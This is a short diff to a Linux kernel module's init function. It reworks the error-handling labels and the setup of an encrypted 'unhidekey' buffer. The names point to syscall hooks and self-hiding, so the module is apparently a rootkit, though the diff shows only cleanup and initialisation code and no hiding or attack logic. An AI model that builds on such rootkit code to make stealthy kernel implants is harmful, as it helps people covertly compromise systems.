@@ -772,6 +772,7 @@ static void _unroll_init(void) {
 
 static int __init kv_init(void) {
 
+    u8 buf[16] = {0};
     int rv = 0;
     char *procname_err = "";
     const char **name;
@@ -829,19 +830,17 @@ cont:
     /** Init crypto engine */
     if (kv_crypto_init() < 0) {
         prerr("Failed to initialise crypto engine\n");
-        goto unroll_init;
+        goto crypto_error;
     }
 
     if (!(kvmgc_unhidekey = crypto_init())) {
         prerr("Failed to encrypt unhidekey\n");
         kv_crypto_deinit();
-        goto unroll_init;
+        goto crypto_error;
     }
 
-    size_t datalen = 16;
-    u8 buf[16] = {0};
     memcpy(buf, &auto_unhidekey, 8);
-    kv_encrypt(kvmgc_unhidekey, buf, datalen);
+    kv_encrypt(kvmgc_unhidekey, buf, sizeof(buf));
 
     /** discard saved key */
     auto_unhidekey = 0;
@@ -879,20 +878,24 @@ cont:
 
 unroll_init:
     prerr("Could not load basic functionality.\n");
-    _unroll_init();
-    rv = -EFAULT;
-    goto leave;
+    goto error;
 addr_error:
     prerr("Could not get kernel function address, proc file not created.\n");
-    rv = -EFAULT;
-    goto leave;
+    goto error;
 sys_init_error:
     prerr("Could not load syscalls hooks\n");
-    rv = -EFAULT;
-    goto leave;
+    goto error;
 procname_missing:
     prerr("%s\n", procname_err);
+    goto error;
+crypto_error:
+    prerr("Crypto init error\n");
+
+error:
+    prerr("Unrolling\n");
+    _unroll_init();
     rv = -EFAULT;
+
 leave:
     return rv;
 }
